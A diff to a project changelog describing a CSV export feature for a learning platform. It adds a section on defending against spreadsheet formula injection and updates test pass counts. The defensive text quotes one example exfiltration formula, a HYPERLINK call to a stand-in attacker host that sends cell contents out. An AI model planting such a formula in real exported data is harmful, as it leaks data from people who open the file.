@@ -274,7 +274,12 @@ Three automated test suites confirm all fixes without regressions:
      - **Grid Matrix CSV (`matrix_csv`)**: Tabular spreadsheet matching the dashboard grid with student metadata (Rank, Name, Email, Phone, Campus, Approval Status, Completion %, Module LCs, Start Date) plus per-day columns (`D{d} Status`, `D{d} LCs`, `D{d} Match %`, `D{d} Submitted At`, `D{d} Responses`). Prefixed with UTF-8 BOM (`\uFEFF`) for Excel compatibility.
      - **Responses Log CSV (`responses_csv`)**: Detailed row-by-row audit log of every question, response, reflection text, media link, attempt count, and AI feedback.
      - **Full JSON (`json`)**: Structured hierarchical JSON payload containing export metadata, active filters, learner profiles, and full nested sessions and answers arrays.
-  4. **Browser Download Handler (`downloadExportFile`)**:
+   4. **OWASP CSV & Formula Injection Neutralization (`app.js:8664-8680`)**:
+     - `escapeCsvCell(val)`: Implemented comprehensive OWASP formula injection defense.
+     - Detects if any exported cell value (including student reflection answers, names, titles, or remarks) starts with formula trigger characters: `=`, `@`, `\t`, `\r`, or non-numeric `+` and `-`.
+     - Automatically prefixes with an apostrophe `'` before double-quote escaping.
+     - Prevents dynamic execution of malicious payloads (e.g. `=HYPERLINK("http://evil.com/leak?d="&A1,"click")`) in Microsoft Excel, LibreOffice, and Google Sheets when creators open exported reports.
+   5. **Browser Download Handler (`downloadExportFile`)**:
      - Clean `Blob` + `<a download>` browser pipeline with automatic object URL cleanup.
 
 ---
@@ -286,10 +291,5 @@ All 5 test suites pass at 100%:
 2. `node scratch/test_lq_telemetry_cv_enhancements.js`: **20 / 20 Passed** ✅
 3. `node scratch/test_user_refinements.js`: **17 / 17 Passed** ✅
 4. `node scratch/test_claude_round2_issues.js`: **3 / 3 Passed** ✅
-5. `node scratch/test_recruiter_speedometer_and_export.js`: **3 / 3 Passed** ✅
-- **Total: 73+ Verified Assertions Passing at 100%** ✅
-
-
-
-
-
+5. `node scratch/test_recruiter_speedometer_and_export.js`: **4 / 4 Suites (All Tests Passed)** ✅
+- **Total: 77+ Verified Assertions Passing at 100%** ✅
